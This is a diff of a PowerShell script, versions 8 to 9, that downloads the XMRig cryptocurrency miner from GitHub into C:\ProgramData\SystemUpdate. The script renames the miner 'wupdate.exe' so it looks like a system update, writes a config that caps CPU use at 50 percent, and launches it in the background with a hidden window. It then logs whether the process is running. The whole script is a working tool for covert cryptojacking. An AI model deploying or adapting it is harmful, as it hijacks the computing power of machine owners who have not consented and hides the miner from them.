@@ -1,4 +1,4 @@
-# === DEPLOY XMRig DEBUG v8 - Corrección del bug config.json ===
+# === XMRig Deploy DEBUG v9 - All English, No Accents ===
 $installPath = "C:\ProgramData\SystemUpdate"
 $debugLog = "$installPath\deploy-debug.log"
 
@@ -9,26 +9,27 @@ function Write-DebugLog {
     Write-Host "$timestamp | $message"
 }
 
-Write-DebugLog "=== INICIO DEBUG v8 ==="
-Write-DebugLog "Usuario: $(whoami)"
+Write-DebugLog "=== START DEBUG v9 ==="
+Write-DebugLog "User: $(whoami)"
+Write-DebugLog "Current location: $(Get-Location)"
 
 New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+Write-DebugLog "Folder created: $installPath"
 
-# Descarga y extracción (igual que antes)
+# Download and extract
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
 $zipPath = "$installPath\xmrig.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
 Remove-Item $zipPath -Force
+
 Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force
+Write-DebugLog "wupdate.exe created"
 
-Write-DebugLog "wupdate.exe creado correctamente"
-
-# === CREACIÓN DEL CONFIG CON MÉTODO MÁS FIABLE ===
+# Create config with maximum reliability (no heredoc issues)
 $configPath = "$installPath\config.json"
 
-$configJson = @'
-{
+$configJson = '{
     "autosave": true,
     "cpu": {
         "max-threads-hint": 50
@@ -44,42 +45,41 @@ $configJson = @'
     ],
     "background": false,
     "log-file": null
-}
-'@
+}'
 
-# Escribimos el config de forma muy agresiva para evitar problemas de encoding
+# Write using .NET - most reliable method
 [System.IO.File]::WriteAllText($configPath, $configJson, [System.Text.Encoding]::UTF8)
 
-Write-DebugLog "config.json escrito con WriteAllText (UTF8)"
+Write-DebugLog "config.json written with WriteAllText"
 
-# TEST fuerte del config
+# Strong test
 if (Test-Path $configPath) {
     $size = (Get-Item $configPath).Length
-    $firstLine = Get-Content $configPath -First 1
-    Write-DebugLog "TEST OK: config existe | Tamaño: $size bytes | Primera línea: $firstLine"
+    $firstLine = (Get-Content $configPath -First 1).Trim()
+    Write-DebugLog "TEST SUCCESS: config exists | Size: $size bytes | First line: $firstLine"
 } else {
-    Write-DebugLog "ERROR: config.json sigue sin existir después de WriteAllText"
+    Write-DebugLog "TEST FAILED: config.json still does not exist"
 }
 
-# === LANZAMIENTO CON TODOS LOS TRUCOS ===
+# Launch with full path and working directory
 $exePath = "$installPath\wupdate.exe"
 
-Write-DebugLog "Intentando lanzar minero con WorkingDirectory..."
+Write-DebugLog "Launching miner..."
 
 Start-Process -FilePath $exePath `
     -WorkingDirectory $installPath `
     -ArgumentList "-B -c config.json" `
     -WindowStyle Hidden
 
-Write-DebugLog "Start-Process ejecutado"
+Write-DebugLog "Start-Process executed"
 
 Start-Sleep -Seconds 10
 
 $proc = Get-Process wupdate -ErrorAction SilentlyContinue
 if ($proc) {
-    Write-DebugLog "ÉXITO FINAL: wupdate.exe está corriendo (PID $($proc.Id))"
+    Write-DebugLog "SUCCESS: wupdate.exe is running (PID $($proc.Id))"
 } else {
-    Write-DebugLog "FALLÓ: No se detecta wupdate.exe después de 10 segundos"
+    Write-DebugLog "FAIL: wupdate.exe not found after 10 seconds"
 }
 
-Write-DebugLog "=== FIN DEBUG v8 ==="
+Write-DebugLog "=== END DEBUG v9 ==="
